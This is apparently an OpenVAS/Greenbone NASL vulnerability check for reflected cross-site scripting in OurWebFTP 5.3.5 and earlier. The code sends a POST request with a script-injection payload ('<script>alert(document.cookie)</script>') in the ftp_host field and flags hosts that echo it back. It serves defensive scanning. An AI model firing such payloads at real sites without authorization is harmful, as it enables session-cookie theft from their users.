# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803117");
  script_version("2023-12-13T05:05:23+0000");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2023-12-13 05:05:23 +0000 (Wed, 13 Dec 2023)");
  script_tag(name:"creation_date", value:"2012-12-03 14:58:31 +0530 (Mon, 03 Dec 2012)");
  script_name("OurWebFTP Multiple Cross Site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/51449/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/56763");
  script_xref(name:"URL", value:"https://www.httpcs.com/advisory/httpcs112");
  script_xref(name:"URL", value:"https://www.httpcs.com/advisory/httpcs113");
  script_xref(name:"URL", value:"http://www.securelist.com/en/advisories/51449");
  script_xref(name:"URL", value:"http://seclists.org/fulldisclosure/2012/Dec/24");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/118531/ourwebftp-xss.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of a vulnerable
  site. This may allow the attacker to steal cookie-based authentication
  credentials and to launch other attacks.");

  script_tag(name:"affected", value:"OurWebFTP version 5.3.5 and prior");

  script_tag(name:"insight", value:"Input passed via the 'ftp_host' and 'ftp_user' POST parameters
  to index.php is not properly sanitised before being returned to the user. This
  can be exploited to execute arbitrary HTML and script code in a user's browser
  session in context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"OurWebFTP is prone to multiple cross site scripting vulnerabilities.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port(default:80);

if(!http_can_host_php(port:port))
  exit(0);

useragent = http_get_user_agent();
host = http_host_name(port:port);

foreach dir (make_list_unique("/ourwebftp", "/", http_cgi_dirs(port:port)))
{

  if(dir == "/") dir = "";
  url = dir + "/index.php";
  res = http_get_cache( item:url, port:port );
  if( !res ) continue;

  if( res =~ "^HTTP/1\.[01] 200" && ">OurWebFTP" >< res && ">Online FTP Login<" >< res ) {

    postdata = "ftp_host=%3Cscript%3Ealert%28document.cookie%29%3C%2F" +
               "script%3E&ftp_user=&ftp_pass=&dir=&mwa_control2=op%3" +
               "Alogin&mwb_control2=Enter";

    req = string("POST ", url, " HTTP/1.1\r\n",
                 "Host: ", host, "\r\n",
                 "User-Agent: ", useragent, "\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postdata), "\r\n",
                 "\r\n", postdata);
    res = http_keepalive_send_recv(port:port, data:req);

    if(res =~ "^HTTP/1\.[01] 200" && res && '<script>alert(document.cookie)</script>' >< res &&
       '>Unable to connect to FTP server <' >< res)
    {
      security_message(port:port);
      exit(0);
    }
  }
}

exit(99);
